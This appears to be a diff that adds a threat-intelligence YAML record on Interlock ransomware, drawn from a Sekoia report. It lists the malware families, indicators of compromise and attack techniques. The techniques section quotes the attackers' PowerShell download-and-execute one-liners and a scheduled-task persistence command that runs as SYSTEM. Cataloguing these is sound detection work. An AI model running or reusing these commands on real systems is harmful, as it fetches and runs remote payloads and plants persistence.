@@ -1,0 +1,57 @@
+  \ stealers and a RAT before deploying the ransomware payload."
+attribution: "Unknown actor (APT group) \u2013 no country specified"
+malware_families:
+- Interlock
+- LummaStealer
+- BerserkStealer
+- Interlock RAT
+- Interlock ransomware
+TTPs:
+  processes: []
+  commandline:
+  - cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "$path='c:\\users\\public\\win31.exe';iwr  -outfile
+    $path; start-process $path; start-process '';"
+  - cmd /c start /min powershell -w H -c "$response = Invoke-WebRequest -Uri \"64.95.10[.]95:8080/misteams\"
+    ; Invoke-Expression $([System.Text.Encoding]::UTF8.GetString($response.Content))
+    ; start-process 'https://www.microsoft.com'"
+  - schtasks /create /sc DAILY /tn "TaskSystem" /tr "cmd /C cd %s && %s" /st 20:00
+    /ru system > nul
+  powershell:
+  - $path='c:\\users\\public\\win31.exe';iwr  -outfile $path; start-process $path;
+    start-process '';
+  - $response = Invoke-WebRequest -Uri \"64.95.10[.]95:8080/misteams\" ; Invoke-Expression
+    $([System.Text.Encoding]::UTF8.GetString($response.Content)) ; start-process 'https://www.microsoft.com'
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell
+    destination: 64.95.10[.]95
+    port: 8080
+  file_activity:
+  - C:\Users\<username>\AppData\Roaming\node-v22.11.0-win-x64\<random_str>.log
+  - c:\\users\\public\\win31.exe
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 1f568c2eaa8325bf7afcf7a90f9595f8b601a085769a44c4ffa1cdfdd283594c
+  - 8e273e1e65b337ad8d3b2dec6264ed90d1d0662bd04d92cbd02943a7e12df95a
+  ips:
+  - 64.95.10[.]95
+  domains:
+  - trycloudflare.com
+  - microsoft-msteams.com
+  - microstteams.com
+  - ecologilives.com
+  - advanceipscaner.com
+  urls: []
+authors:
+- Erwan Chevalier
+- Felix Aime
+- Jeremy Scion
+- Pierre Le Bourhis
+- Sekoia TDR team
+reference: https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar
+date_of_publication: April 16, 2025
+file_creation_date: October 01, 2025
